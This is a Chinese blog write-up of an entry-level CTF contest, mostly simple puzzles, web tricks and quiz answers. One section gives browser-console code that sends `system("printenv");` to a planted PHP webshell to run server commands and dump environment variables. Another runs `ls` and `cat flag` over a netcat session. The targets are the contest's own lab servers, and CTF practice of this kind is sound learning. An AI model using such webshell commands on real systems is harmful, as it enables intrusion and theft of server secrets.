---
author: longlin
pubDatetime: 2024-10-15T12:00:00+08:00
modDatetime: 2024-10-22T18:12:47+08:00
title: 405 CTF Writeup
slug: 405ctf
featured: true
draft: false
tags:
  - ctf
description: 405 CTF WirteUP
---

群里看到本部 CTF 战队办了个 欢乐赛，于是跑来凑个热闹（

只能写写简单题，稍微难点的就做不出了（

## 签到

第一问送分

第二问下载图片后查看详细信息找到 exif 即可

## HelloWorld

懒得写脚本了，把题目描述丢给 GPT，让它帮我写吧（ 毕竟是教学题，并不难

```py
import requests

# 目标 URL
url = "http://405.trainoi.com:27498/?spell=viwo50"

# POST 请求的数据 (十六进制表示为 ed8080)
data = b"\xaa\xbb\xcc\xdd"

# 自定义 HTTP 请求头，添加 To: Doraemon
headers = {
    "To": "Doraemon"
}

# 定义 Cookies
cookies = {
    "icecream": "good",
    "friedchicken": "nice"
}

# 发送带有自定义请求头和 Cookies 的 POST 请求
response = requests.post(url, data=data, headers=headers, cookies=cookies)

# 输出响应
print("Status Code:", response.status_code)
print("Response Text:", response.text)

```

## 跑马场

找到 ma.php ，控制台里输入：

```js
fetch("ma.php", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: new URLSearchParams({
    lilac: 'system("printenv");',
  }),
})
  .then(response => response.text())
  .then(data => console.log(data));
```

（还是一道教学题

## 赛博上香

控制台里修改 cnt 大小，再点击 button 即可

`flag{N0w_U_kn0w_Java5cr1pt}`

## Password

按顺序逐一测试出符合条件的密码即可：

1 :密码长度必须大于等于8位

3:密码必须包含大写字母

4 :密码必须包含本次比赛主办方'Lilac'

5 :密码中数字之和必须等于27

6 :密码中必须包含特殊字符(非字母数字)

7 :密码中必须包含游戏《以撒的结合(The Binding of Isaac)》中17位可控主角之一的英文名(首字母大写)

- 咕噜咕噜一下就知道了，我直接选的 `Isaac`

9 :密码中罗马数字的乘积必须等于250

- 罗马数字共有7个，即 Ⅰ（1）、Ⅴ（5）、Ⅹ（10）、Ⅼ（50）、Ⅽ（100）、Ⅾ（500）和 Ⅿ（1000）

10 :密码中必须包含一个下图数独中放置一个 1 不会破坏数独规则的位置(不考虑死局的情况),例:a3

```
      1   2   3   4   5   6   7   8   9
    ┌───┬───┬───┬───┬───┬───┬───┬───┬───┐
 a  │ 3 │   │   │   │   │   │ 2 │   │ 4 │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 b  │   │   │ 9 │   │ 6 │   │   │   │ 7 │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 c  │   │ 5 │ 1 │ 4 │ 9 │   │   │   │ 3 │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 d  │   │   │ 2 │   │   │ 3 │   │ 5 │   │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 e  │   │ 7 │   │ 5 │   │ 9 │   │   │   │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 f  │   │ 3 │   │ 1 │   │   │ 4 │ 2 │ 9 │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 g  │   │   │   │ 9 │ 5 │   │ 6 │   │   │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 h  │ 2 │ 9 │   │   │   │ 4 │ 1 │   │   │
    ├───┼───┼───┼───┼───┼───┼───┼───┼───┤
 i  │ 6 │   │   │   │   │ 1 │   │ 3 │   │
    └───┴───┴───┴───┴───┴───┴───┴───┴───┘

```

11: 密码中必须包含3735928559的16进制表示(小写)

- 转换后发现是字符 `deadbeef`

12 :密码中必须包含经纬度"24S 134E"所在的国家(英文名)

- 谷歌地图一搜发现是 「澳大利亚」

13 :密码中必须包含一个闰年

14 :密码中必须包含以下语句之一
I am War
I am Awake
I am Rich
I am Healthy
你在高塔的混沌深处不断攀行，不知不觉间，你愕然发现者自己的思绪开始变得非常……真实……
各种怪物和财宝的影响开始有了实体。
这些感觉稍纵即逝，你准备怎么做？

15 :密码中必须包含祭品字母
在你的密码开头，使用两个$$将两个不相同的字母包裹起来，将其作为祭品，献给神，在之后的密码中，不能出现作为祭品的字母，例：`$ae$` 神说："你要带你的儿子，就是你所爱的独子以撒，往摩利亚地去，在我指示你的一座山上，把他献为燔祭。"

- 看一眼当前密码发现并未出现 `gh` 这两个字母

17 :密码中需要出现至少 4 个 2 个字母的化学元素符号(重复不计)

- 如果要满足之前的所有问题，Au 和 Li 便是一定出现了的
- 所找化学元素不能包含任何「罗马数字」

18 :密码中出现的化学元素的原子序数的总和需要正好等于 277 个原子数(重复不计)

- 这题非常奇怪，因为感觉最后给出的答案并没符合这一条件（化学全忘光了

19 :密码中元音字母的数量必须相同(忽略大小写)

- 计算当前各 元音字母 数量后，把缺失的补在末尾

20 :密码中必须包含密码的长度

21 :密码中必须存在三个连续字符，其 md5 值等于 d5cf0db546ff63f90be78fbbd35b1a59

- md5 破解得到三个连续字符为 `Tod`

最终密码：

`$gh$196Lilac&IsaacV&d2deadbeefAustraliaI am WarNeNieeeeeiiiiuuuuuuuuooooooooTod81`

然后拿到 flag

`Lilac{Str0ng_3nough_p@ssword!}`

## 有穷战争

进入游戏后检查元素，可以直接看到 javascript 里的 flag

光打游戏也是可以的，但是窝不会玩 qaq（ bgm 太吵

`Lilac{u_r_r3@lly_@_t0w3r_d3f3nc3_m4ster}`

## 奶龙笑传之答答题

做完这题后感觉我已经完全懂了 **奶龙** （这么暴力的灌入奶龙知识亚大哟

如果没有在规定时间内完成答题（ 3 个选项完全可以手动暴力破解），服务器会强制断开，所以在 nc 上服务器的第一时间就 `ctrl+v` 把之前测出的答案一口气发完，再测试后面的题目。

最终测出的答案为：`AABDCDCCDACABCCBDA`

答完题后，虽然还是会弹出 「太慢了，你完全不懂奶龙」，但可以发现服务器并未断开连接，接着只需：

```shell
ls
cat flag
```

即可拿到 flag

`flag{2c163d94e773ddbee3eae7afbd2fe116}`

## Neuro 的邪恶计划

这题多做几次可以发现，Neuro 的出招顺序是与你出招顺序绑定的；

如果你的出招顺序不变，Neuro的出招顺序也不会变。

最终测得过关的出招顺序是（ O 为「拳头」，X 为「布」，Y 为「剪刀」）：

```
OXXOY OOXXX
OOOXY XYXYY
XOXXX OOXXO
OXXXO OOYYO
YYOOX OXOYO
```

`flag{8ac9fd75784675a36e15b7d0675bf49b}`

## 复活吧，客服小祥！

也是扮演 soyorin 做了一回坏人（

虽然但是，最后 旁白 有点生草

![](@assets/images/405CTF/saki.png)

`flag{f115635a95a2454b5b807f573a9c4028}`

## CatMine

不会逆向，玩完小游戏后拿到 Task1 flag（
